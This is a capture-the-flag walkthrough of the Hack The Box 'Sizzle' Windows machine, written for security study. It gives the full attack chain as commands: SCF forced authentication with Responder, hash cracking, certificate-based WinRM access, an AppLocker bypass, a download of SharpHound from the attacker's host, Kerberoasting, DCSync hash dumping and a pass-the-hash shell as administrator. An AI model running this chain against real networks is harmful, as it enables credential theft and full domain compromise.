---
date: 2025-04-22
categories: [CTF, HTB]
title: "HTB - Sizzle"
tags: ['bloodhound', 'hashcat', 'impacket', 'linux', 'mimikatz', 'nmap', 'privilege escalation', 'python', 'rce', 'secretsdump', 'smb', 'smbmap', 'windows']

description: "Sizzle - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Sizzle

NMAP

![image1](../resources/38d81cb012454ca19c127cebc93ba568.png)

Add sizzle.htb.local to /etc/hosts

```bash
smbmap -H sizzle.htb.local -u 'guest' -p ''

```

![image2](../resources/9f60c6c138a24fbdb38b1f87aa1e9ba5.png)

- Two non standard shares:
Department Shares

Operations

- We can connect to Department Shares:

![image3](../resources/0c66f60f30834defa0c1c33fca8ab2e1.png)

There are a lot of folders and some could be writable

- To determine if any is writable - we need to mount the share first:
```bash
sudo mount -t cifs -o rw,username=guest,password= '//sizzle.htb.local/Department Shares' /mnt

cd /mnt

```
- Now use a bash script to recursively test each folder:

```bash
#!/bin/bash

echo "Writable folders within /mnt directory:"

# Use find command to list directories under /mnt
# Attempt to create a file in each directory to check writability

find /mnt -type d -exec sh -c 'touch "$1/x" 2>/dev/null && echo "$1 is writable"' sh {} \;

```
- The script needs to be run with **sudo**:

![image4](../resources/b176e8f9dc414b67a754c2f26899df48.png)

- Two writable shares were found:
/mnt/Users/Public

/mnt/ZZ_ARCHIVE

<u>SCF File attack</u>

<https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication>

The way this works is a victim user opens the share  `\\sizzle.htb.local\ZZ_ARCHIVE`  and the icon.scf gets executed automatically, which in turn forces the victim system to attempt to authenticate to the attacking system at 10.10.14.31, where responder is listening

- Create an SCF file - icon.scf:

![image5](../resources/199e3d833df24aff97c2a04e9268be5b.png)

- Connect to the share
```bash
smbclient //sizzle.htb.local/'Department Shares'

```
Upload the icon.scf file to the writable folders

- Set up Responder:
```bash
sudo ./Responder.py -I tun0

```

![image6](../resources/a27ebb6119c241cab4de2e92c023a775.png)

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

```

![image7](../resources/ad3062e659d041e28692b4b27e2076f3.png)

- We have credentials:
**Amanda : Ashare1972**


![image8](../resources/af02e649940645b0a6733cdb18143161.png)

- Trying to connect via winrm fails - but it gives an error message:
```bash
evil-winrm -i sizzle.htb.local -u amanda -p Ashare1972

```

![image9](../resources/d5c89499816047dcb58b14b2666ae1b5.png)


![image10](../resources/378b5570dba74f2081294217b9c2941e.png)


![image11](../resources/a5ee11575d2d4f2fba246ece3ca1664a.png)

- Amanda has read on the CertEnroll Share:
```bash
smbmap -H sizzle.htb.local -u amanda -p Ashare1972

```

![image12](../resources/2cc3ed0f72b941f48c4ab83c635edb2f.png)

- The share contains CA certs:
```bash
smbclient //sizzle.htb.local/'CertEnroll' -U 'amanda%Ashare1972'

```

![image13](../resources/dc49dd31b5574775a097bf8c3ae3b5aa.png)

- Doing another scan with enum4linux:
```bash
enum4linux -u amanda -p Ashare1972 -a sizzle.htb.local

```

![image14](../resources/efd192181074413fae79a4fa411c9ffc.png)


![image15](../resources/6ffed38a5b174bdcba26dbd48185ebd2.png)

We can see there is a Certificate Service

- Access the Certificate Services Web Enrollment interface (certsrv):

![image16](../resources/e6f9cd88e2524359ace6742cbd8c027e.png)

- Log in with the credentials for Amanda

`http://sizzle.htb.local/certsrv/`


![image17](../resources/598c34acbcca4db781eb1e5a20065256.png)

- We are on the Certificate Services site - Where you can request a cert:

![image18](../resources/9e53e6d3d55242c29855db3aa0633b5b.png)

- If we try and request a Certificate without creating a CSR (Certificate Signing Request) first - it fails:

![image19](../resources/70092eda0a22405388fd1898a32db489.png)

**<u>Requesting a certificate:</u>**

[https://thesecmaster.com/blog/how-to-request-a-certificate-from-windows-adcs](https://thesecmaster.com/blog/how-to-request-a-certificate-from-windows-adcs)

- Generate a CSR (OpenSSL)
[https://phoenixnap.com/kb/generate-openssl-certificate-signing-request](https://phoenixnap.com/kb/generate-openssl-certificate-signing-request)
- Requesting a new certificate
- Check the status of the pending certificate request (skip)
- Download the certificate, certificate chain, or CRL

- <u>Step 1 - Generate CSR (leave all options blank):</u>
```bash
openssl req -new -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr

```

![image20](../resources/49952eb43855427882d96d627b42f177.png)

This will produce two files:


![image21](../resources/aff691befb504e7789af27c9dc6a41af.png)

- <u>Step 2 - Request new certificate:</u>

Copy contents of the CSR:


![image22](../resources/1c8cdb36a798453a90834838aec4ed10.png)

Go to:

<http://sizzle.htb.local/certsrv/> -\> Request a Certificate -\> Advanced certificate request


![image23](../resources/01f00d480b4d4e209248b199803e03f0.png)

Paste in the content of amanda.csr and click Submit

- <u>Step 4 - Download certificate (either one will work):</u>

![image24](../resources/af3e6b6ec4c44e1d8efbdd6d62ad63d6.png)

If you download a DER encoded certificate you can read it with:

```bash
openssl x509 -inform der -in certnew.cer -noout -text

```
**<u>To use the certificate to connect over WinRM - We have two choices:</u>**

[https://medium.com/r3d-buck3t/certificate-based-authentication-over-winrm-13197265c790#0558](https://medium.com/r3d-buck3t/certificate-based-authentication-over-winrm-13197265c790#0558)

- **<u>Option 1 (Evil-WinRM):</u>**

We can see that with Evil-WinRM we can supply a Public and Private key


![image25](../resources/4b41a747ea1e414387df0deda405384d.png)

```bash
evil-winrm -S -i 10.129.7.164 -u amanda -p Ashare1972 -c certnew.cer -k amanda.key

```

![image26](../resources/8be3fd436e07412da0b2d5d391d5c0fe.png)

- **<u>Option 2 (WinRM Ruby Script):</u>**

- First, we need to install WinRM gem:
```bash
sudo gem install winrm

```
- We copy the script and update it to include:
  - **endpoint URL to the WSMan service**
  - client certificate (certnew.cer)
  - user’s private key (amanda.key)
[https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb](https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb)


![image27](../resources/c058e455923c44e696122fdf22749ade.png)

**Note: WSMan and WinRM are different technologies; WSMan is the protocol for accessing and managing resources over a network. While WinRM is a Windows-specific implementation of the WS-Man protocol.**

- Run the script:
```bash
ruby winrm_shell.rb

```

![image28](../resources/f58c6e3ab6e641759ada3f8d678b9e28.png)

To run on Windows - look at the bottom of this link:

[https://medium.com/r3d-buck3t/certificate-based-authentication-over-winrm-13197265c790#0558](https://medium.com/r3d-buck3t/certificate-based-authentication-over-winrm-13197265c790#0558)

- We get permission denied when trying to upload files, even after setting the execution policy to bypass:
```bash
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

```

![image29](../resources/f609b1aee1224cd4b8c9906816add0b1.png)

- This probably means that AppLocker is running:
```bash
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

```

![image30](../resources/cd1f05800f874edf9d15172b59667594.png)

Here we can see that AppLocker is indeed running and that the default rules have been set on this host for executables, scripts and Windows installer files.

The default rules that are set, permit the execution of executables only from within **C:\Windows\\**.

This means that we can only execute .exe files from that folder or any subfolders inside (from the wildcard).

The only issue is that these folders generally have tight permissions by default.

AppLocker defines executable rules as any files with the .exe and .com extensions that are associated with an app.

AppLocker defines script rules to include only the following file formats: .ps1 ; .bat ; .cmd ; .vbs ; .js

Windows installer rules: .msi

**<u>AppLocker Bypass – Writeable Folders</u>**

[https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md)

This is whitelisted by default: **C:\Windows\System32\spool\drivers\color**


![image31](../resources/47f044cdcfe24d95b96e1029af55713d.png)

- Use icacls to check:
  - We can use icacls to look through all of the folders, subfolders and files in C:\Windows:
```bash
icacls C:\Windows\* /t /c /q | findstr /i "(F) (M) (W) (R,W) (RX,WD) :\" | findstr /i ":\\ everyone authenticated users todos %username%"

```
- Or we can only list the folders and subfolders (smaller output):
```bash
icacls C:\Windows\* /t /c /q | findstr /i "(F) (M) (W) (R,W) (RX,WD) :\" | findstr /i ":\\ everyone authenticated users todos %username%" | findstr /i /v "\."

```

- Or try each directory individually:
```bash
icacls C:\Windows\System32\spool\drivers\color /t /c /q | findstr /i "(F) (M) (W) (R,W) (RX,WD) :\" | findstr /i ":\\ everyone authenticated users todos %username%"

```

![image32](../resources/0a220f75dd614cc3be569202c3d4112e.png)

- Or we can add all those potential directories into a txt file and run **(must be in cmd)**:
```bash
for /F %A in (C:\temp\icacls.txt) do ( cmd.exe /c icacls "%~A" 2>nul | findstr /i "(F) (M) (W) (R,W) (RX,WD) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. ) 

```
- So we can see that **C:\Windows\System32\spool\drivers\color** is writable

- cd to C:\Windows\System32\spool\drivers\color
- We can't use evil-winrm's built in upload

- Using wget and python http.server or using impacket-smbserver
```bash
wget http://10.10.14.31/SharpHound.exe -O sharphound.exe

```
- Run SharpHound:
```bash
.\sharphound.exe -c all

```
- We can write to the Share "Department Shares\ZZ_ARCHIVE", so copy the loot file to there:

![image33](../resources/409b82811b854b4490b0091b60e9b209.png)

- Acces the share and get the loot file:
```bash
smbclient //sizzle.htb.local/'Department Shares' -U "amanda%Ashare1972"

```
- From the bloodhound output, we can see that:

There are 2 kerberoastable users


![image34](../resources/09833a1f08a047f1b55382d853450e4c.png)

And that user MRLKY has DCSync rights:


![image35](../resources/adb2d60f9f0c4e2aa3f9125d31ae4bde.png)

- But when we try to Kerberoast:
```bash
impacket-GetUserSPNs htb.local/amanda:Ashare1972 –dc-ip 10.129.7.164 -request

```

![image36](../resources/e4e716d907ae4aeea64e9fb931c4dc82.png)

It gets the user mrlky because the has a valid SPN set but it can't Kerberoast the user because port 88 isn't exposed externally

- Running netstat, we can see that port 88 is open but only internally (UDP):

![image37](../resources/708893dd2a99422cb06b52288b7f6cc8.png)


![image38](../resources/c54eaf6f85294427bfa1af17d7aac912.png)


![image39](../resources/c073fba66a5e4bef98d6b5ae52ab1442.png)

- To kerberoast locally, we can use Rubeus:
```bash
.\Rubeus.exe kerberoast /user:mrlky

```

![image40](../resources/ccb7b2a2df8444ff8e737bff062aa5c0.png)

But this gives an error - To do with the Logon type


![image41](../resources/4ecbc8dc699d4b269dc37409c1063c64.png)

- **<u>To fix this we can either:</u>**

  - Upload Powerview and use Invoke-UserImpersonation:

```powershell
$Password = ConvertTo-SecureString 'Ashare1972' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('HTB.LOCAL\amanda', $Password)
Invoke-UserImpersonation -Credential $Cred
Invoke-Kerberoast

```

- Or use RunasCs:

```bash
.\RunasCs.exe amanda -d htb.local Ashare1972 -l 2 "C:\Windows\System32\spool\drivers\color\Rubeus.exe kerberoast /user:mrlky /nowrap"

```

![image42](../resources/befe58dd6b5d44eca06df94c97777820.png)

- Copy the hash to a file and crack:
```bash
hashcat -m 13100 -a 0 hash2.txt /usr/share/wordlists/rockyou.txt
```

![image43](../resources/03d137b7b3a941289595cb44f29aeb5b.png)

**Mrlky : Football#7**

- Since the user has DCSync rights - we can dump hashes:
```bash
impacket-secretsdump htb.local/mrlky:Football#7@10.129.7.164

```

![image44](../resources/8e798a871beb46cabe2f8545841a5188.png)

or mimikatz:

```bash
mimikatz lsadump::dcsync /user:administrator /domain:htb.local /dc:sizzle

```
- Now use either smbexec.py , psexec.py or wmiexec.py to get a shell:
```bash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 htb.local/administrator@10.129.7.164

```

![image45](../resources/8bf3be1db1724c55ac52b52f6d0e5312.png)

```bash
type user.txt

type root.txt

```